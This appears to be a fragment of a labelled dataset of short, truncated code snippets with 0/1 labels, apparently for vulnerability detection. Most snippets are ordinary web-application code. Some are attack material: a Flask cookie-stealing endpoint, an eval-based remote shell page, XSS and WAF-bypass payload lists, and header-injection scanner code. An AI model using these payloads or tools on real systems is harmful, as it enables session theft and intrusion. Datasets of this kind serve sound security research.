13094, "code": ".accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P", "label": 0}, {"snippet_id": 48797, "code": " as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object): def get_title(self): if self.label", "label": 0}, {"snippet_id": 34938, "code": ".meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t", "label": 0}, {"snippet_id": 50018, "code": "\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL +re.MULTILINE) _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, Promise)", "label": 0}, {"snippet_id": 53868, "code": "['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-------------", "label": 0}, {"snippet_id": 43336, "code": "(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname", "label": 0}, {"snippet_id": 2623, "code": " headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1", "label": 0}, {"snippet_id": 51330, "code": ".encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions=[] @admin.register(UrlList) class UrlListAdmin(ImportExportModelAdmin", "label": 0}, {"snippet_id": 26990, "code": " check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")=", "label": 0}, {"snippet_id": 24957, "code": ".should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github", "label": 0}, {"snippet_id": 3932, "code": ".com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload", "label": 1}, {"snippet_id": 25304, "code": " isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict()) if 'required' in final_attrs: del final_attrs['required'] id_=final_attrs.get('id', None) for", "label": 0}, {"snippet_id": 1350, "code": " if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], ", "label": 0}, {"snippet_id": 38250, "code": " txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))", "label": 0}, {"snippet_id": 23425, "code": " url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER", "label": 0}, {"snippet_id": 36489, "code": "\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\"", "label": 0}, {"snippet_id": 47821, "code": "(request.POST[\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk", "label": 0}, {"snippet_id": 9758, "code": "<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid", "label": 0}, {"snippet_id": 9715, "code": "'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login", "label": 0}, {"snippet_id": 16539, "code": " settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 29035, "code": " % script) \t \tproxy_serv=proxy if proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port", "label": 0}, {"snippet_id": 20911, "code": "'404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$", "label": 0}, {"snippet_id": 36774, "code": ".name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text", "label": 0}, {"snippet_id": 29767, "code": "\t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"-\") \t\t\tif serv==ip[0]: \t\t\t\treturn_files.add(file) \t\treturn sorted(return_files", "label": 0}, {"snippet_id": 28289, "code": " \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*.old\") template=template.render(h2=1, title=\"Working with HAProxy configs\", \t\t\t\t\t\t\trole=role, \t\t\t\t\t\t\taction=\"config.py\", \t\t\t\t\t\t\tuser=user, \t\t\t\t\t\t\tselect_id", "label": 0}, {"snippet_id": 51774, "code": "/dashboard/\" LOGOUT_REDIRECT_URL=LOGIN_URL TWO_FACTOR_QR_FACTORY='qrcode.image.pil.PilImage' TWO_FACTOR_TOTP_DIGITS=6 TWO_FACTOR_PATCH_ADMIN=True FIELD_ENCRYPTION_KEY=os.environ.get('FIELD_ENCRYPTION_KEY',", "label": 0}, {"snippet_id": 48135, "code": ".highResFile=\"/\" +high_res_file_name m.lowResFile=\"/\" +low_res_file_name m.headline=headline m.save() mu: MediaUpload=MediaUpload() mu.UID=u mu.MID=m mu.save() logging.info(\"Uploaded file '\" +str(file.name", "label": 1}, {"snippet_id": 48558, "code": "] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\") srid: int=int(request.GET[\"srid\"]) sr: SubReservation=None if", "label": 0}, {"snippet_id": 9492, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 52696, "code": " response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get(", "label": 0}, {"snippet_id": 9733, "code": "/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 51373, "code": "', 'message', 'user', 'upload_date', 'filesize') search_fields=('internal_filename', 'orginal_filename', 'message') list_filter=['message', 'upload_date', 'user'][::-1] fields=('original_filename', 'internal_filename", "label": 1}, {"snippet_id": 12605, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 53659, "code": ".fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user,", "label": 0}, {"snippet_id": 8972, "code": "\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses", "label": 0}, {"snippet_id": 5605, "code": " _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<-", "label": 0}, {"snippet_id": 46925, "code": ", redis.enqueue_job('mention_users', self.id, content, user_id), return_exceptions=True ) return obj async def del_comment(self, user_id, comment_id): c=await Comment.get(id=comment_id) if c and c.github_id", "label": 0}, {"snippet_id": 7720, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index", "label": 0}, {"snippet_id": 11819, "code": "'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', ", "label": 0}, {"snippet_id": 53847, "code": " flask import Flask,request from termcolor import colored app=Flask(__name__) @app.route('/') def index(): \treturn 'steal cookie:) ' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request", "label": 1}, {"snippet_id": 44880, "code": "'oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse", "label": 0}, {"snippet_id": 15444, "code": ".install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super", "label": 0}, {"snippet_id": 35785, "code": ".idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label", "label": 0}, {"snippet_id": 46560, "code": ") def admin_collection_delete(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController", "label": 0}, {"snippet_id": 32918, "code": "=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s/%s\">%s/</a", "label": 1}, {"snippet_id": 14583, "code": " given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" ", "label": 0}, {"snippet_id": 13645, "code": "', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views", "label": 0}, {"snippet_id": 14590, "code": "'{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir", "label": 0}, {"snippet_id": 32132, "code": " filter_string): \"\"\"Naive case-insensitive search.\"\"\" q=filter_string.lower() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules", "label": 0}, {"snippet_id": 6044, "code": "': '8088', 'pysaml2_config': 'idp_conf.py', 'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir': None, 'ssl_adapter': 'builtin', 'server_cert': None, 'server_key': None,", "label": 0}, {"snippet_id": 29489, "code": " \t\tif not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class", "label": 0}, {"snippet_id": 42004, "code": ".append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance", "label": 0}, {"snippet_id": 51581, "code": "={ 'mysql':{'init_command': \"SET character_set_connection=utf8,\" \"collation_connection=utf8_unicode_ci,\" \"sql_mode='STRICT_ALL_TABLES';\"}, } DB_ENGINE=os.environ.get('DB_ENGINE', 'mysql') DATABASE_ENGINES", "label": 0}, {"snippet_id": 34772, "code": " key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns", "label": 0}, {"snippet_id": 8634, "code": " name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-", "label": 0}, {"snippet_id": 20041, "code": "\"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color", "label": 0}, {"snippet_id": 36174, "code": " in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None,", "label": 0}, {"snippet_id": 4932, "code": "<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg", "label": 0}, {"snippet_id": 44223, "code": " liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node", "label": 0}, {"snippet_id": 4937, "code": "<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//'", "label": 0}, {"snippet_id": 13744, "code": "', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index", "label": 1}, {"snippet_id": 15287, "code": ".org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env", "label": 0}, {"snippet_id": 50329, "code": " host_string, 'csessid': csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive", "label": 0}, {"snippet_id": 22599, "code": "', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),", "label": 0}, {"snippet_id": 15787, "code": "), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd", "label": 0}, {"snippet_id": 48981, "code": ") return value def render(self): return format_html( '<td>{}</td>', self.format(self.get_value()) ) def render_link(self): if not hasattr(self.object, 'get_absolute_url'): raise SmartListException(\"Please", "label": 0}, {"snippet_id": 23001, "code": "', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 49597, "code": ".query_params.get(search_query_param, '') self.search_query_param=search_query_param self.ordering_query_value=self.query_params.get(ordering_query_param, '') self.ordering_query_param=ordering_query_param", "label": 0}, {"snippet_id": 49817, "code": ">[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch(e){ output=e+\"\" } socket.emit('sendMSG',output) }) </script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def", "label": 1}, {"snippet_id": 29976, "code": "-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging(\"local\", \"users.py \texcept: \t\tpass \t\t\t if serv and form.getvalue('ssl_cert'): \tcert_local_dir=funct.get_config_var('main', ", "label": 0}, {"snippet_id": 44245, "code": " find_dollar_variables, find_dollar_braced_variables LOG=logging.getLogger(__name__) def list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request", "label": 0}, {"snippet_id": 42363, "code": " \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype", "label": 0}, {"snippet_id": 49114, "code": ".startswith(\"-\"): return True return False def get_add_sort_by(self): if not self.is_ordered(): if self.query_order: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self", "label": 0}, {"snippet_id": 42003, "code": "\t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance", "label": 0}, {"snippet_id": 21380, "code": "<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(", "label": 1}, {"snippet_id": 9309, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware", "label": 0}, {"snippet_id": 43535, "code": "=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t", "label": 0}, {"snippet_id": 19146, "code": "\"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR", "label": 0}, {"snippet_id": 11488, "code": " from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$", "label": 0}, {"snippet_id": 17849, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 54113, "code": ",proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at:{}\\n[*]Duration:{} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time", "label": 0}, {"snippet_id": 45798, "code": " _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle", "label": 0}, {"snippet_id": 54009, "code": " datetime try: from tkinter import * from tkinter import ttk except: print(\"You need to install: tkinter\") sys.exit() try: import bane except: print(\"You need to install: bane\") sys.exit() class sc(threading", "label": 0}, {"snippet_id": 40322, "code": "\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df", "label": 1}, {"snippet_id": 28218, "code": " %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue", "label": 0}, {"snippet_id": 47575, "code": " maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', text=str(profile.notes))) else: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email')", "label": 0}, {"snippet_id": 35857, "code": "\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content", "label": 0}, {"snippet_id": 54037, "code": " run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane", "label": 0}, {"snippet_id": 14252, "code": "'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete')", "label": 0}, {"snippet_id": 18140, "code": ".views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 4169, "code": ".query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload", "label": 0}, {"snippet_id": 44752, "code": ") for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split(", "label": 0}, {"snippet_id": 45860, "code": ".fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user,", "label": 0}, {"snippet_id": 44757, "code": " copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse", "label": 0}, {"snippet_id": 18825, "code": "'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns", "label": 0}, {"snippet_id": 42021, "code": " key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t", "label": 0}, {"snippet_id": 28060, "code": "=datetime.datetime.now() +expires_in self.response.set_cookie( 'session', session_cookie, expires=expires, httponly=True, secure=True, overwrite=True) self.render_json({'status': 'success'}) class LogoutHandler", "label": 0}, {"snippet_id": 39552, "code": "\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t", "label": 0}, {"snippet_id": 52120, "code": "() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json", "label": 1}, {"snippet_id": 19298, "code": " default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store", "label": 0}, {"snippet_id": 40581, "code": " \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None", "label": 0}, {"snippet_id": 25349, "code": "[i][1], ) final_attrs['data-size']=self.scheme['fields'][i][2] output.append(widget.render(name +'_%s' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def", "label": 0}, {"snippet_id": 35100, "code": "+[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t", "label": 0}, {"snippet_id": 19532, "code": "('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command", "label": 0}, {"snippet_id": 45980, "code": "\"klass\":\"card card-widget span12\"}]}, {\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True", "label": 0}, {"snippet_id": 46866, "code": "' return markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST): await clear_mc(key % self.post_id) @property async def user(self): return await GithubUser.get(gid", "label": 0}, {"snippet_id": 3271, "code": " XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body", "label": 0}, {"snippet_id": 49120, "code": " if not self.is_ordered(): if self.query_order: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order) }) else: return self.get_url_with_query_params", "label": 0}, {"snippet_id": 29542, "code": "\t\telse: \t\t\tproc_count=0 \treturn proc_count\t\t def ssh_command(serv, commands, **kwargs): \tssh=ssh_connect(serv) \t\t \tfor command in commands: \t\ttry: \t\t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty", "label": 0}, {"snippet_id": 15783, "code": "(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"", "label": 0}, {"snippet_id": 34013, "code": "\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict", "label": 0}, {"snippet_id": 46518, "code": "=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse(collections", "label": 0}, {"snippet_id": 28474, "code": ".SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \t\tuser_uuid=cookie.get('uuid') \t\tlogin=sql.get_user_name_by_uuid(user_uuid.value) \texcept: \t\tpass \t\t \tif kwargs.get('alerting')==1: \t\tmess=get_data('date_in_log')", "label": 0}, {"snippet_id": 35095, "code": " for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef", "label": 0}, {"snippet_id": 36272, "code": " set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname", "label": 0}, {"snippet_id": 45259, "code": "'id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2", "label": 0}, {"snippet_id": 15541, "code": ".num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), 